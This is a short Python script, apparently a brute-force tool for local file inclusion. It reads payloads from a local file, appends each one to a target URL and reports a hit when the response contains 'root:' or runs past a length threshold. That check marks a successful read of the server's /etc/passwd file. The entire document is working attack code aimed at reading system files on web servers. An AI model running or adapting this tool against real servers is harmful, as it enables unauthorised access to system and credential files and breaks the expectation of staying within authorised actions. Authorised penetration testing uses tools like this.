# BruteForce Tool for dir Search/LFI

import requests
import sys

url = "http://test.com"
payload_file = "./LFIPayload.txt"

def test_lfi():
    with open(payload_file, "r") as f:
        payloads = [line.strip() for line in f if line.strip()]

    print(f"[+] Payload lines: {len(payloads)}")

    for payload in payloads:
        try:
            r = requests.get(url + payload, timeout=5)
            if "root:" in r.text or len(r.text) > 320:
                print(f"[+] VULN!: {payload}")
                print(f"    lengt: {len(r.text)} | Status: {r.status_code}")
            else:
                print(f"[-] Code: {r.status_code}")
        except Exception as e:
            print(f"[!] ERROR: {e}")

if __name__ == "__main__":
    test_lfi()

